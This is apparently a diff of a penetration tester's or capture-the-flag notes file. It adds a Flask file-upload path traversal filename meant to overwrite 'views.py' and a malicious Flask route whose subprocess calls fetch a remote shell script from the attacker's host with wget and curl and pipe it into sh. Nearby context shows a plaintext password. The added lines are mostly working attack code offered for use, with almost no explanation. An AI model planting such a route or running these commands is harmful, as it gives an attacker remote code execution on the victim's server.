@@ -346,6 +346,18 @@ docker-compose.yml
       - /home/developer/gitea/data:/data
         /data/gitea/gitea.db
 
+[*] Flask
+-->> File Upload Traversal
+filename="..//app/app/views.py"
+
+-->> Malicious Route
+@app.route('/x')
+def rev():
+    import subprocess
+    subprocess.Popen("wget -qO- http://$MYIP:8888/resh|sh", shell=True)
+    subprocess.Popen("curl http://$MYIP:8888/resh|sh", shell=True)
+    return ""
+
 [*] Pluck
 +---------- Set Password ----------+
 XPASSWORD=lexypoo97
